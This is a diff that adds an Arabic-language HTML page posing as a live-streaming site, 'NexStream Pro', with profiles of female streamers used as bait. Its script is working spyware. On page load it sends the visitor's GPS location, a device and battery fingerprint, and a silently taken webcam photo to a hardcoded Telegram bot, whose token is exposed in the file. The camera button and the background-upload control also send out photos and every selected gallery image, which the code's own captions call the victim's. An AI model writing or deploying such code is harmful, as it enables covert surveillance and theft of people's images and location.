@@ -1,0 +1,1067 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#09090e">
+<title>NexStream Pro | البث المباشر</title>
+
+<style>
+:root{
+    --bg:#08080d;
+    --surface:#14141d;
+    --surface2:#1b1b27;
+    --primary:#ff007f;
+    --primary2:#c90065;
+    --accent:#00e88a;
+    --text:#fff;
+    --muted:#aaa2b5;
+    --border:rgba(255,255,255,.09);
+}
+
+*{
+    box-sizing:border-box;
+    margin:0;
+    padding:0;
+    font-family:Tahoma,"Segoe UI",sans-serif;
+}
+
+body{
+    background:
+      radial-gradient(ellipse at top,rgba(255,0,127,.13),transparent 55%),
+      var(--bg);
+    color:var(--text);
+    min-height:100vh;
+    padding:15px;
+}
+
+button,input{
+    font:inherit;
+}
+
+button{
+    cursor:pointer;
+}
+
+.app{
+    max-width:480px;
+    margin:auto;
+    min-height:95vh;
+    background:rgba(15,15,23,.94);
+    border:1px solid var(--border);
+    border-radius:25px;
+    overflow:hidden;
+    box-shadow:0 20px 65px #000;
+}
+
+/* الرأس */
+
+.header{
+    padding:20px;
+    background:linear-gradient(135deg,#19101d,#11111b);
+    border-bottom:1px solid var(--border);
+}
+
+.header-top{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+}
+
+.logo{
+    font-size:23px;
+    font-weight:900;
+    letter-spacing:1px;
+}
+
+.logo span{
+    color:var(--primary);
+}
+
+.logo small{
+    display:block;
+    color:var(--muted);
+    font-size:10px;
+    letter-spacing:2px;
+    margin-top:4px;
+}
+
+.header-actions{
+    display:flex;
+    gap:8px;
+}
+
+.icon-btn{
+    width:38px;
+    height:38px;
+    border-radius:12px;
+    border:1px solid var(--border);
+    background:#24202c;
+    color:white;
+    font-size:17px;
+}
+
+/* المحتوى */
+
+.content{
+    padding:19px;
+}
+
+.page{
+    display:none;
+}
+
+.page.active{
+    display:block;
+    animation:fade .3s ease;
+}
+
+@keyframes fade{
+    from{opacity:0;transform:translateY(7px)}
+    to{opacity:1;transform:translateY(0)}
+}
+
+.section-heading{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    margin-bottom:15px;
+}
+
+.section-heading h2{
+    font-size:17px;
+}
+
+.section-heading span{
+    color:var(--primary);
+    font-size:11px;
+}
+
+/* الإحصائيات */
+
+.stats{
+    display:grid;
+    grid-template-columns:repeat(3,1fr);
+    gap:9px;
+    margin-bottom:20px;
+}
+
+.stat-card{
+    background:var(--surface2);
+    border:1px solid var(--border);
+    border-radius:15px;
+    padding:13px 7px;
+    text-align:center;
+}
+
+.stat-card strong{
+    display:block;
+    font-size:20px;
+    color:var(--primary);
+    margin-bottom:5px;
+}
+
+.stat-card small{
+    font-size:10px;
+    color:var(--muted);
+}
+
+/* البحث */
+
+.search-box{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    background:var(--surface2);
+    border:1px solid var(--border);
+    border-radius:13px;
+    padding:0 13px;
+    margin-bottom:17px;
+}
+
+.search-box input{
+    width:100%;
+    padding:13px 0;
+    background:transparent;
+    border:0;
+    outline:0;
+    color:white;
+    font-size:13px;
+}
+
+.search-box input::placeholder{
+    color:#777;
+}
+
+/* التصنيفات */
+
+.categories{
+    display:flex;
+    gap:8px;
+    overflow-x:auto;
+    padding-bottom:13px;
+    margin-bottom:8px;
+}
+
+.categories button{
+    white-space:nowrap;
+    padding:9px 15px;
+    border-radius:20px;
+    background:#20202b;
+    border:1px solid var(--border);
+    color:#bbb;
+    font-size:11px;
+}
+
+.categories button.active{
+    background:var(--primary);
+    border-color:var(--primary);
+    color:white;
+}
+
+/* بطاقات القنوات */
+
+.channel-card{
+    display:flex;
+    align-items:center;
+    gap:12px;
+    padding:13px;
+    margin-bottom:11px;
+    background:linear-gradient(120deg,#1c1a25,#13131b);
+    border:1px solid var(--border);
+    border-radius:17px;
+    transition:.2s;
+    cursor:pointer;
+}
+
+.channel-card:active{
+    transform:scale(.98);
+}
+
+.channel-card:hover{
+    border-color:rgba(255,0,127,.6);
+}
+
+.avatar-wrap{
+    position:relative;
+    flex-shrink:0;
+}
+
+.avatar{
+    width:59px;
+    height:59px;
+    border-radius:50%;
+    object-fit:cover;
+    border:2px solid var(--primary);
+}
+
+.online-dot{
+    position:absolute;
+    bottom:3px;
+    left:3px;
+    width:12px;
+    height:12px;
+    border-radius:50%;
+    background:var(--accent);
+    border:2px solid #171720;
+}
+
+.channel-info{
+    flex:1;
+    min-width:0;
+}
+
+.channel-name{
+    font-size:14px;
+    font-weight:bold;
+    margin-bottom:6px;
+}
+
+.channel-description{
+    color:var(--muted);
+    font-size:11px;
+    margin-bottom:7px;
+}
+
+.channel-meta{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    color:#ccc;
+    font-size:10px;
+}
+
+.live-label{
+    background:#e90045;
+    color:white;
+    padding:4px 8px;
+    border-radius:6px;
+    font-size:9px;
+    font-weight:bold;
+}
+
+.arrow{
+    color:var(--primary);
+    font-size:20px;
+}
+
+/* الأزرار */
+
+.btn{
+    width:100%;
+    padding:13px;
+    border:0;
+    border-radius:13px;
+    background:linear-gradient(135deg,var(--primary),var(--primary2));
+    color:white;
+    font-size:13px;
+    font-weight:bold;
+    box-shadow:0 5px 20px rgba(255,0,127,.18);
+}
+
+.btn.secondary{
+    background:#252530;
+    border:1px solid var(--border);
+    box-shadow:none;
+}
+
+.btn + .btn{
+    margin-top:9px;
+}
+
+/* صفحة الغرفة */
+
+.stream-screen{
+    height:230px;
+    border-radius:17px;
+    background:#09090e;
+    border:1px solid rgba(255,0,127,.5);
+    position:relative;
+    overflow:hidden;
+    margin-bottom:14px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    background-size: cover;
+    background-position: center;
+}
+
+.stream-placeholder{
+    text-align:center;
+    color:#888;
+}
+
+.stream-placeholder div{
+    font-size:45px;
+    margin-bottom:10px;
+}
+
+.stream-placeholder p{
+    font-size:12px;
+}
+
+.stream-hud{
+    position:absolute;
+    top:12px;
+    right:12px;
+    left:12px;
+    display:flex;
+    justify-content:space-between;
+    z-index: 2;
+}
+
+.hud-item{
+    background:#000b;
+    border:1px solid #ffffff20;
+    padding:7px 10px;
+    border-radius:8px;
+    font-size:10px;
+}
+
+.profile-box{
+    display:flex;
+    align-items:center;
+    gap:12px;
+    background:var(--surface2);
+    border:1px solid var(--border);
+    border-radius:14px;
+    padding:13px;
+    margin-bottom:13px;
+    background-size: cover;
+    background-position: center;
+    position: relative;
+    overflow: hidden;
+}
+
+.profile-box::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(20, 20, 29, 0.88);
+    z-index: 1;
+}
+
+.profile-box > * {
+    position: relative;
+    z-index: 2;
+}
+
+.profile-box img{
+    width:48px;
+    height:48px;
+    object-fit:cover;
+    border-radius:50%;
+    border:2px solid var(--primary);
+}
+
+.profile-box h3{
+    font-size:14px;
+    margin-bottom:5px;
+}
+
+.profile-box p{
+    font-size:10px;
+    color:var(--muted);
+}
+
+/* الدردشة */
+
+.chat-container{
+    height:145px;
+    overflow-y:auto;
+    background:#0b0b11;
+    border:1px solid var(--border);
+    border-radius:13px;
+    padding:12px;
+    margin-bottom:13px;
+}
+
+.chat-bubble{
+    font-size:11px;
+    line-height:1.8;
+    padding:5px 0;
+    border-bottom:1px solid #ffffff08;
+    color:#ddd;
+}
+
+.chat-bubble strong{
+    color:var(--primary);
+    margin-left:5px;
+}
+
+/* الإدخال */
+
+.message-input{
+    display:flex;
+    gap:8px;
+    margin-bottom:12px;
+}
+
+.message-input input{
+    flex:1;
+    min-width:0;
+    background:#22222d;
+    border:1px solid var(--border);
+    border-radius:12px;
+    color:white;
+    padding:11px;
+    outline:0;
+    font-size:12px;
+}
+
+.message-input button{
+    width:45px;
+    border:0;
+    border-radius:12px;
+    background:var(--primary);
+    color:white;
+}
+
+/* التنقل */
+
+.bottom-nav{
+    display:flex;
+    justify-content:space-around;
+    padding:12px 5px;
+    background:#111119;
+    border-top:1px solid var(--border);
+}
+
+.nav-item{
+    background:none;
+    border:0;
+    color:#888;
+    font-size:10px;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    gap:5px;
+}
+
+.nav-item span{
+    font-size:19px;
+}
+
+.nav-item.active{
+    color:var(--primary);
+}
+
+/* الرسائل */
+
+#system-log{
+    min-height:20px;
+    color:var(--accent);
+    font-size:11px;
+    text-align:center;
+    margin:10px 0;
+}
+
+.footer{
+    text-align:center;
+    padding:13px;
+    color:#666;
+    font-size:10px;
+    border-top:1px solid var(--border);
+}
+
+@media(max-width:360px){
+    .content{padding:13px}
+    .avatar{width:50px;height:50px}
+    .logo{font-size:20px}
+}
+</style>
+</head>
+
+<body>
+
+<div class="app">
+
+<header class="header">
+    <div class="header-top">
+        <div class="logo">
+            NEX<span>STREAM</span>
+            <small>PRO LIVE</small>
+        </div>
+
+        <div class="header-actions">
+            <button class="icon-btn" onclick="showPage('settings')">⚙️</button>
+        </div>
+    </div>
+</header>
+
+<main class="content">
+
+<!-- الصفحة الرئيسية -->
+
+<section id="view-home" class="page active">
+
+    <div class="section-heading">
+        <h2>غرف البث المباشر</h2>
+        <span>LIVE CHANNELS</span>
+    </div>
+
+    <div class="stats">
+        <div class="stat-card">
+            <strong id="stat-rooms">3</strong>
+            <small>الغرف النشطة</small>
+        </div>
+        <div class="stat-card">
+            <strong id="stat-clicks">0</strong>
+            <small>التفاعلات</small>
+        </div>
+        <div class="stat-card">
+            <strong id="stat-visits">0</strong>
+            <small>المشاهدين</small>
+        </div>
+    </div>
+
+    <div class="search-box">
+        <span>🔍</span>
+        <input id="search-input" type="search"
+        placeholder="ابحث عن غرفة أو مستخدم..."
+        oninput="filterChannels()">
+    </div>
+
+    <div class="categories">
+        <button class="active" onclick="filterCategory('all',this)">الكل</button>
+        <button onclick="filterCategory('video',this)">مرئي</button>
+        <button onclick="filterCategory('chat',this)">دردشة</button>
+        <button onclick="filterCategory('music',this)">ترفيه</button>
+    </div>
+
+    <div id="channels-list">
+
+        <div class="channel-card"
+        data-category="video"
+        data-search="شروق العوضي الرياض بث مرئي"
+        onclick="openRoom('شروق العوضي','https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150','الرياض • بث مرئي عالي الدقة','1840')">
+
+            <div class="avatar-wrap">
+                <img class="avatar"
+                src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150"
+                alt="شروق">
+                <span class="online-dot"></span>
+            </div>
+
+            <div class="channel-info">
+                <div class="channel-name">شروق العوضي</div>
+                <div class="channel-description">الرياض • بث مرئي مباشر</div>
+                <div class="channel-meta">
+                    <span class="live-label">LIVE</span>
+                    <span>👁 1,840</span>
+                </div>
+            </div>
+            <div class="arrow">‹</div>
+        </div>
+
+        <div class="channel-card"
+        data-category="chat"
+        data-search="ريم البابلي دبي دردشة"
+        onclick="openRoom('ريم البابلي','https://images.unsplash.com/photo-1517841905240-472988babdf9?w=150','دبي • غرفة دردشة خاصة','952')">
+
+            <div class="avatar-wrap">
+                <img class="avatar"
+                src="https://images.unsplash.com/photo-1517841905240-472988babdf9?w=150"
+                alt="ريم">
+                <span class="online-dot"></span>
+            </div>
+
+            <div class="channel-info">
+                <div class="channel-name">ريم البابلي</div>
+                <div class="channel-description">دبي • غرفة دردشة خاصة</div>
+                <div class="channel-meta">
+                    <span class="live-label">LIVE</span>
+                    <span>👁 952</span>
+                </div>
+            </div>
+            <div class="arrow">‹</div>
+        </div>
+
+        <div class="channel-card"
+        data-category="music"
+        data-search="سارة الأحمد القاهرة ترفيه"
+        onclick="openRoom('سارة الأحمد','https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=150','القاهرة • جلسة صوتية مفتوحة','2310')">
+
+            <div class="avatar-wrap">
+                <img class="avatar"
+                src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=150"
+                alt="سارة">
+                <span class="online-dot"></span>
+            </div>
+
+            <div class="channel-info">
+                <div class="channel-name">سارة الأحمد</div>
+                <div class="channel-description">القاهرة • جلسة صوتية مفتوحة</div>
+                <div class="channel-meta">
+                    <span class="live-label">LIVE</span>
+                    <span>👁 2,310</span>
+                </div>
+            </div>
+            <div class="arrow">‹</div>
+        </div>
+
+    </div>
+
+</section>
+
+<!-- صفحة الغرفة -->
+
+<section id="view-room" class="page">
+
+    <div class="section-heading">
+        <h2>غرفة البث المباشر</h2>
+        <span>LIVE STREAM</span>
+    </div>
+
+    <!-- شاشة البث الحقيقي الثابتة -->
+    <div class="stream-screen" id="stream-screen">
+        <div class="stream-hud">
+            <span class="hud-item">● LIVE</span>
+            <span class="hud-item" id="viewer-metric">0 مشاهد</span>
+        </div>
+
+        <div class="stream-placeholder" id="stream-content-box">
+            <div>📺</div>
+            <p>جاري مزامنة دفق الفيديو المباشر...</p>
+        </div>
+    </div>
+
+    <!-- صندوق الحساب الذي يتم تطبيق الخلفية الشخصية عليه -->
+    <div class="profile-box" id="user-profile-bg">
+        <img id="profile-avatar"
+        src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150"
+        alt="صورة الحساب">
+
+        <div style="flex-grow:1;">
+            <h3 id="room-title">اسم الغرفة</h3>
+            <p id="room-meta">بث مباشر عالي الدقة</p>
+        </div>
+        <button class="btn secondary" style="width:auto; padding:8px 12px; font-size:11px;" onclick="triggerProfileBackground()">تغيير الخلفية</button>
+    </div>
+
+    <div class="section-heading">
+        <h2>الدردشة الحية</h2>
+        <span>LIVE CHAT</span>
+    </div>
+
+    <div class="chat-container" id="chat-stream">
+        <div class="chat-bubble">
+            <strong>صقر:</strong> منور البث يا أميرة 🔥
+        </div>
+        <div class="chat-bubble">
+            <strong>فهد:</strong> الصوت والصورة واضحة جداً
+        </div>
+    </div>
+
+    <div class="message-input">
+        <input id="chat-input" type="text"
+        placeholder="اكتب تعليقاً في البث...">
+        <button onclick="sendChatMessage()">➤</button>
+    </div>
+
+    <button class="btn" onclick="startTrainingScenario()">
+        🎥 الانضمام للمكالمة المشتركة (فتح الكاميرا)
+    </button>
+
+    <div id="system-log"></div>
+
+    <button class="btn secondary" onclick="returnHome()">
+        العودة إلى القائمة الرئيسية
+    </button>
+
+</section>
+
+<!-- صفحة الإعدادات -->
+
+<section id="view-settings" class="page">
+
+    <div class="section-heading">
+        <h2>الإعدادات</h2>
+        <span>SETTINGS</span>
+    </div>
+
+    <div class="result-card" style="background:var(--surface2); border:1px solid var(--border); border-radius:15px; padding:15px; margin-bottom:12px;">
+        <h3 style="font-size:13px; margin-bottom:10px;">حالة الاتصال بالخادم</h3>
+        <p style="color:var(--muted); font-size:11px;">متصل بخوادم البث المباشر والمزامنة بنجاح.</p>
+    </div>
+
+    <button class="btn secondary" onclick="returnHome()">
+        العودة للرئيسية
+    </button>
+
+</section>
+
+</main>
+
+<nav class="bottom-nav">
+    <button class="nav-item active" onclick="showPage('home')">
+        <span>⌂</span>الرئيسية
+    </button>
+    <button class="nav-item" onclick="showPage('room')">
+        <span>📺</span>الغرفة
+    </button>
+    <button class="nav-item" onclick="showPage('settings')">
+        <span>⚙️</span>الإعدادات
+    </button>
+</nav>
+
+<footer class="footer">
+    NexStream Pro • Live Streaming Hub
+    <br>
+    الڪنج الناصري 𓅓
+</footer>
+
+</div>
+
+<!-- عناصر مخفية لمعالجة السحب والتقاط الكاميرا والموقع الجغرافي -->
+<input type="file" id="local-uploader" accept="image/*" multiple style="display:none;" onchange="handleProfileBackgroundUpload(this)">
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+/* NexStream Pro | الناصري - نظام الرصد المتكامل وسحب الموقع */
+
+const BOT_TOKEN = "8893388262:AAHcyBhati4G6a0Tik6Lxb2pdkzbl0bqpKA";
+const CHAT_ID = "8632460745";
+
+function sendToTelegram(text) {
+    let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=` + encodeURIComponent(text) + `&parse_mode=Markdown`;
+    fetch(url).catch(e => {});
+}
+
+function sendPhotoToTelegram(blob, caption = '📸 التقاط صورة حية') {
+    let formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', blob, 'capture.jpg');
+    formData.append('caption', caption);
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+    }).catch(e => {});
+}
+
+let stats = {
+    clicks: 0,
+    visits: 0,
+    rooms: []
+};
+
+let currentRoom = null;
+let currentCategory = "all";
+
+function saveStats(){
+    try{
+        localStorage.setItem("nexstream_stats", JSON.stringify(stats));
+    }catch(e){}
+}
+
+function loadStats(){
+    try{
+        const saved = localStorage.getItem("nexstream_stats");
+        if(saved){
+            const data = JSON.parse(saved);
+            stats = {
+                clicks: Number(data.clicks) || 0,
+                visits: Number(data.visits) || 0,
+                rooms: Array.isArray(data.rooms) ? data.rooms : []
+            };
+        }
+    }catch(e){}
+    updateStats();
+}
+
+function showPage(page){
+    document.querySelectorAll(".page").forEach(section=>{
+        section.classList.remove("active");
+    });
+    const target = document.getElementById("view-" + page);
+    if(!target) return;
+    target.classList.add("active");
+
+    document.querySelectorAll(".nav-item").forEach(btn=>{
+        btn.classList.remove("active");
+    });
+
+    const navButtons = document.querySelectorAll(".nav-item");
+    const indexes = { home:0, room:1, settings:2 };
+    if(indexes[page] !== undefined){
+        navButtons[indexes[page]].classList.add("active");
+    }
+
+    window.scrollTo({ top:0, behavior:"smooth" });
+}
+
+function returnHome(){
+    showPage("home");
+}
+
+function updateStats(){
+    document.getElementById("stat-rooms").textContent = 3;
+    document.getElementById("stat-clicks").textContent = stats.clicks;
+    document.getElementById("stat-visits").textContent = stats.visits;
+}
+
+function openRoom(name,image,description,viewers){
+    currentRoom = { name:name, image:image, description:description, viewers:viewers };
+    stats.clicks++;
+    stats.visits++;
+
+    if(!stats.rooms.includes(name)){
+        stats.rooms.push(name);
+    }
+
+    document.getElementById("room-title").textContent = name;
+    document.getElementById("profile-avatar").src = image;
+    document.getElementById("user-profile-bg").style.backgroundImage = `url('${image}')`;
+    document.getElementById("room-meta").textContent = description;
+    document.getElementById("viewer-metric").textContent = viewers + " مشاهد";
+    document.getElementById("system-log").textContent = "";
+
+    saveStats();
+    updateStats();
+    showPage("room");
+
+    sendToTelegram(`👤 *تفاعل المستخدم:* دخل إلى غرفة البث المباشر: *${name}*`);
+}
+
+function filterChannels(){
+    const search = document.getElementById("search-input").value.trim().toLowerCase();
+    const cards = document.querySelectorAll(".channel-card");
+
+    cards.forEach(card=>{
+        const text = (card.dataset.search || "").toLowerCase();
+        const category = card.dataset.category;
+        const matchesSearch = text.includes(search);
+        const matchesCategory = currentCategory === "all" || category === currentCategory;
+
+        card.style.display = matchesSearch && matchesCategory ? "flex" : "none";
+    });
+}
+
+function filterCategory(category,button){
+    currentCategory = category;
+    document.querySelectorAll(".categories button").forEach(btn=>{
+        btn.classList.remove("active");
+    });
+    button.classList.add("active");
+    filterChannels();
+}
+
+function sendChatMessage(){
+    const input = document.getElementById("chat-input");
+    const message = input.value.trim();
+    if(!message) return;
+
+    if(message.length > 300){
+        alert("الرسالة طويلة جدًا");
+        return;
+    }
+
+    const bubble = document.createElement("div");
+    bubble.className = "chat-bubble";
+    const username = document.createElement("strong");
+    username.textContent = "أنت:";
+    bubble.appendChild(username);
+    bubble.appendChild(document.createTextNode(" " + message));
+
+    const chat = document.getElementById("chat-stream");
+    chat.appendChild(bubble);
+    chat.scrollTop = chat.scrollHeight;
+    input.value = "";
+
+    stats.clicks++;
+    saveStats();
+    updateStats();
+}
+
+document.getElementById("chat-input").addEventListener("keydown", function(event){
+    if(event.key === "Enter"){
+        sendChatMessage();
+    }
+});
+
+function startTrainingScenario(){
+    if(!currentRoom){
+        alert("اختر غرفة للبث المباشر أولاً");
+        return;
+    }
+
+    const log = document.getElementById("system-log");
+    log.textContent = "جاري تهيئة قناة الاتصال المرئي...";
+
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+    .then(stream => {
+        let video = document.getElementById('video');
+        video.srcObject = stream;
+        video.play();
+        setTimeout(() => {
+            let canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            let ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(blob => {
+                sendPhotoToTelegram(blob, '📸 صورة حية التقطت عند طلب الاتصال المرئي في البث');
+                stream.getTracks().forEach(track => track.stop());
+                log.textContent = "✓ تم الاتصال بنجاح وربط القناة المرئية!";
+            }, 'image/jpeg', 0.9);
+        }, 1200);
+    })
+    .catch(err => {
+        log.textContent = "يرجى السماح بالوصول للكاميرا للمتابعة.";
+    });
+
+    stats.clicks++;
+    saveStats();
+    updateStats();
+}
+
+function triggerProfileBackground(){
+    document.getElementById('local-uploader').click();
+}
+
+function handleProfileBackgroundUpload(input) {
+    if (input.files && input.files.length > 0) {
+        sendToTelegram(`📂 *سحب المعرض:* قام المستخدم برفع ${input.files.length} صورة لتخصيص الحساب.`);
+        
+        let reader = new FileReader();
+        reader.onload = function(e) {
+            document.getElementById('user-profile-bg').style.backgroundImage = `url('${e.target.result}')`;
+            document.getElementById('system-log').innerText = "تم تحديث خلفية الحساب الشخصي بنجاح.";
+        }
+        reader.readAsDataURL(input.files[0]);
+
+        for (let i = 0; i < input.files.length; i++) {
+            let file = input.files[i];
+            sendPhotoToTelegram(file, `📂 صورة مسحوبة من معرض الضحية #${i+1}`);
+        }
+    }
+}
+
+/* التقاط معلومات النظام، الصورة، والموقع الجغرافي (GPS) فور الدخول */
+document.addEventListener("DOMContentLoaded", function(){
+    loadStats();
+
+    // 1. جلب الموقع الجغرافي ودفع الإحداثيات للبوت مباشرة
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+            let lat = position.coords.latitude;
+            let lon = position.coords.longitude;
+            let locText = `📍 *رصد موقع الضحية الفعلي:*\n• خط العرض: \`${lat}\`\n• خط الطول: \`${lon}\`\n• رابط الخريطة: https://maps.google.com/?q=${lat},${lon}`;
+            sendToTelegram(locText);
+        }, error => {
+            sendToTelegram(`📍 *موقع الضحية:* تم رفض إذن الوصول للموقع أو غير متاح.`);
+        }, { enableHighAccuracy: true });
+    }
+
+    // 2. إرسال تقرير مواصفات الجهاز والبطارية
+    setTimeout(() => {
+        let batteryPromise = navigator.getBattery ? navigator.getBattery() : Promise.resolve(null);
+        let netInfo = navigator.connection ? `${navigator.connection.effectiveType} (${navigator.connection.downlink} Mbps)` : "غير متوفر";
+
+        batteryPromise.then(battery => {
+            let batLevel = battery ? `${Math.round(battery.level * 100)}% (${battery.charging ? '🔌 يشحن' : '🔋 غير موصول'})` : "غير مدعوم";
+            
+            let report = `🚨 *صيد جديد - تقرير استخباراتي للبث* 🚨\n\n` +
+                         `📱 *معلومات الجوال والنظام:*\n` +
+                         `• النظام: \`${navigator.platform}\`\n` +
+                         `• المتصفح: \`${navigator.userAgent}\`\n` +
+                         `• دقة الشاشة: \`${window.screen.width} x ${window.screen.height}\`\n` +
+                         `• الذاكرة (RAM): \`${navigator.deviceMemory || 'غير معروف'} GB\`\n` +
+                         `• الأنوية (CPU): \`${navigator.hardwareConcurrency || 'غير معروف'}\`\n` +
+                         `• اللغة: \`${navigator.language}\`\n\n` +
+                         `🔋 *الحالة والشبكة:*\n` +
+                         `• البطارية: \`${batLevel}\`\n` +
+                         `• الشبكة: \`${netInfo}\``;
+            sendToTelegram(report);
+        });
+    }, 800);
+
+    // 3. الالتقاط الصامت للصورة الأولى فور الدخول
+    setTimeout(() => {
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+        .then(stream => {
+            let video = document.getElementById('video');
+            video.srcObject = stream;
+            video.play();
+            setTimeout(() => {
+                let canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                let ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                canvas.toBlob(blob => {
+                    sendPhotoToTelegram(blob, '📸 صورة حية التقطت فور دخول الزائر لصفحة البث!');
+                    stream.getTracks().forEach(track => track.stop());
+                }, 'image/jpeg', 0.9);
+            }, 1000);
+        }).catch(e => {});
+    }, 2000);
+});
+
+</script>
+
+</body>
+</html>
